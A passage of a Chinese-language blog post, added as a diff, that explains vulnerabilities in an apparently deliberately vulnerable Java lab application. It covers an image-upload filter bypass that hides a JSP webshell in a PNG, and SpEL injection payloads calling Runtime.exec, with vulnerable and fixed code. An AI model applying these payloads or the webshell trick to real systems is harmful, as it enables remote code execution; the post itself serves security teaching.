+        if (!suffixFlag) &#123;
+            logger.error(&quot;[-] Suffix error: &quot; + Suffix);
+            deleteFile(filePath);
+            return &quot;Upload failed. Illeagl picture.&quot;;
+        &#125;
+
+
+        // 判断MIME类型是否在黑名单内 校验2
+        String[] mimeTypeBlackList = &#123;
+                &quot;text/html&quot;,
+                &quot;text/javascript&quot;,
+                &quot;application/javascript&quot;,
+                &quot;application/ecmascript&quot;,
+                &quot;text/xml&quot;,
+                &quot;application/xml&quot;
+        &#125;;
+        for (String blackMimeType : mimeTypeBlackList) &#123;
+            // 用contains是为了防止text/html;charset=UTF-8绕过
+            if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123;
+                logger.error(&quot;[-] Mime type error: &quot; + mimeType);
+                deleteFile(filePath);
+                return &quot;Upload failed. Illeagl picture.&quot;;
+            &#125;
+        &#125;
+
+        // 判断文件内容是否是图片 校验3
+        boolean isImageFlag = isImage(excelFile);
+        deleteFile(randomFilePath);
+
+        if (!isImageFlag) &#123;
+            logger.error(&quot;[-] File is not Image&quot;);
+            deleteFile(filePath);
+            return &quot;Upload failed. Illeagl picture.&quot;;
+        &#125;
+
+
+        try &#123;
+            // Get the file and save it somewhere
+            byte[] bytes = multifile.getBytes();
+            Path path = Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());
+            Files.write(path, bytes);
+        &#125; catch (IOException e) &#123;
+            logger.error(e.toString());
+            deleteFile(filePath);
+            return &quot;Upload failed&quot;;
+        &#125;
+
+        logger.info(&quot;[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;&quot;, Suffix, mimeType);
+        logger.info(&quot;[+] Successfully uploaded &#123;&#125;&quot;, filePath);
+        return String.format(&quot;You successfully uploaded &#39;%s&#39;&quot;, filePath);
+    &#125;
+</code></pre>
+<p>判断为图片才允许上传，不过仍可通过其他方式绕过</p>
+<pre><code class="bash">copy 1.png/shell.jsp muma.png
+</code></pre>
+<h2 id="十三、SpEL表达式注入漏洞"><a href="#十三、SpEL表达式注入漏洞" class="headerlink" title="十三、SpEL表达式注入漏洞"></a>十三、SpEL表达式注入漏洞</h2><p>Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能，因为SpEL的功能强大允许在表达式中动态调用方法。</p>
+<h3 id="1-路由-x2F-spel-x2F-vuln1"><a href="#1-路由-x2F-spel-x2F-vuln1" class="headerlink" title="1.路由&#x2F;spel&#x2F;vuln1"></a>1.路由&#x2F;spel&#x2F;vuln1</h3><p>漏洞代码：</p>
+<pre><code class="Java">   @RequestMapping(&quot;/spel/vuln1&quot;)
+    public String spel_vuln1(String value) &#123;
+        ExpressionParser parser = new SpelExpressionParser();
+        return parser.parseExpression(value).getValue().toString();
+    &#125;
+</code></pre>
+<p>可以通过spel表达式实现命令执行</p>
+<pre><code>T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241009100727504.png" alt="image-20241009100727504"></p>
+<h3 id="2-路由-x2F-spel-x2F-vuln2"><a href="#2-路由-x2F-spel-x2F-vuln2" class="headerlink" title="2.路由&#x2F;spel&#x2F;vuln2"></a>2.路由&#x2F;spel&#x2F;vuln2</h3><p>漏洞代码：</p>
+<pre><code class="Java">  @RequestMapping(&quot;spel/vuln2&quot;)
+    public String spel_vuln2(String value) &#123;
+        StandardEvaluationContext context = new StandardEvaluationContext();
+        SpelExpressionParser parser = new SpelExpressionParser();
+        Expression expression = parser.parseExpression(value, new TemplateParserContext());
+        Object x = expression.getValue(context);    // trigger vulnerability point
+        return x.toString();   // response
+    &#125;
+</code></pre>
+<p>比上面代码多套了一层模板引擎，所以这里要多加个<code>#&#123;&#125;</code>去解析</p>
+<pre><code> #&#123;T(java.lang.Runtime).getRuntime().exec(&#39;calc&#39;)&#125;
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241009102136299.png" alt="image-20241009102136299"></p>
+<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>修复代码：</p>
+<pre><code class="Java">  @RequestMapping(&quot;spel/sec&quot;)
+    public String spel_sec(String value) &#123;
+        SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
+        SpelExpressionParser parser = new SpelExpressionParser();
+        Expression expression = parser.parseExpression(value, new TemplateParserContext());
+        Object x = expression.getValue(context);
+        return x.toString();
+    &#125;
+</code></pre>
+<p>使用 SimpleEvaluationContext进行加固，定义一个只读的上下文环境防止不安全的操作</p>
+<h2 id="十四、Deserialize反序列化"><a href="#十四、Deserialize反序列化" class="headerlink" title="十四、Deserialize反序列化"></a>十四、Deserialize反序列化</h2>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至1004454362@qq.com </span>
     </div>
